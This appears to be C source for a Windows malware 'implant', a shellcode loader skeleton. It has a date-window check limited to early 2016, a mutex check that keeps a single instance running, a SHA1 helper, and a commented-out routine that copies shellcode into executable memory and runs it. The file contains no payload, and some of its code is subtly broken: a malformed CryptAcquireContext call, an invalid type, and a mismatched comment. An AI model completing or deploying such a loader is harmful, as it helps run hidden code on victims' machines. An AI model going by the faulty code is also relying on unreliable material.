#include "implant.h"
#include "config.h"

//////////////////////////////////////////////////////////////////////////////////
//
//   WinMain
//   Entrypoint
//
//////////////////////////////////////////////////////////////////////////////////

int APIENTRY WinMain(_In_ HINSTANCE hInst,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ LPTSTR    lpCmdLine,
	_In_ int       nCmdShow) {
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(lpCmdLine);

	CheckExecution();
	ExitProcess((UINT)NULL);
}


//////////////////////////////////////////////////////////////////////////////////
//
//   CheckExecution
//   The main function; it performs the various checks and actions
//   and will execute the shellcode if applicable
//
//////////////////////////////////////////////////////////////////////////////////

void CheckExecution() {

	// Perform the date and time check; if it is outside the permitted
	// date, return now
	if (!DateTimeCheck()) return;

	// Perform the Mutex check; if it is already running, quit now
	if (!MutexCheck(MUTEX_NAME)) return;


}


//////////////////////////////////////////////////////////////////////////////////
//
//   MutexCheck
//   Returns FALSE if we should bail out now because of the mutex
//   or TRUE if we can carry on
//
//////////////////////////////////////////////////////////////////////////////////
unsigned int MutexCheck(const char *name) {
	HANDLE mutex = NULL, error = NULL;

	mutex = CreateMutex(NULL, TRUE, name);
	if (mutex == NULL) {
		// Error creating the mutex. This could be because
		// we are trying to create a Global mutex and it exists
		// already.
		return FALSE;
	}
	else {
		// Handle has been returned
		error = (HANDLE)GetLastError();
		if (error == (HANDLE)ERROR_ALREADY_EXISTS) {
			// Mutex already exists
			return FALSE;
		}
		else {
			return TRUE;
		}
	}
}



//////////////////////////////////////////////////////////////////////////////////
//
//   DateTimeCheck()
//   Returns FALSE if we should bail out now because of the mutex
//   or TRUE if we can carry on
//
//////////////////////////////////////////////////////////////////////////////////
unsigned int DateTimeCheck() {

	SYSTEMTIME ct;
	GetSystemTime(&ct);

	// Check that we are between January and July 2016
	if ((ct.wYear == 2016 && ct.wMonth <= 7) && (ct.wYear == 2016 && ct.wMonth >= 1)) {
		return TRUE;
	} else {
		return FALSE;
	}

}



//////////////////////////////////////////////////////////////////////////////////
//
//   GenerateHash()
//   Returns a pointer to a buffer containing a SHA1 hash or FALSE if there is a problem
//
//////////////////////////////////////////////////////////////////////////////////
HGLOBAL GenerateHash(unsigned BYTE *src, unsigned int len) {
	
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	DWORD hash_size_needed;
	DWORD hash_size_needed_len;
	HGLOBAL hash_value;
	HGLOBAL ret = { 0 };

	// Acquire a handle to the general key container
	if (CryptAcquireContext, &hProv, NULL, NULL, PROV_RSA_AES, NULL) {

		// Generate a handle to the SHA1 hash type that we want
		if (CryptCreateHash(hProv, CALG_SHA1, NULL, NULL, &hHash)) {

			// Hash the data
			if (CryptHashData(hHash, src, len, NULL)) {

				// We know it is SHA-1 and therefore 160-bit but I left this in to make it
				// easier and more resilient to changes in hash algorithm choice etc. Therefore,
				// request the hash size from the CryptoAPI
				hash_size_needed_len = 4;
				if (CryptGetHashParam(hHash, HP_HASHSIZE, &hash_size_needed, &hash_size_needed_len)) {

					// Now allocate memory for the hash
					if (hash_value = GlobalAlloc(GPTR, hash_size_needed)) {

						if (CryptGetHashParam(hHash, HP_HASHVAL, hash_value, &hash_size_needed, NULL)) {
							ret = hash_value;
						}

					}
				}

			}

			// Clean up
			CryptDestroyHash(hHash);
		}

		// Clean up
		CryptReleaseContext(hProv, NULL);
	} 
	return (HGLOBAL) ret;
}



void ExecuteShellcode() {

	//char *buffer;
	//void(*shellcodefunction)();
	//unsigned int size = sizeof(buf);

	// No mutex exists, so run the code
	//buffer = VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	//memcpy(buffer, buf, size);
	//shellcodefunction = (void(*)()) buffer;
	//shellcodefunction();
}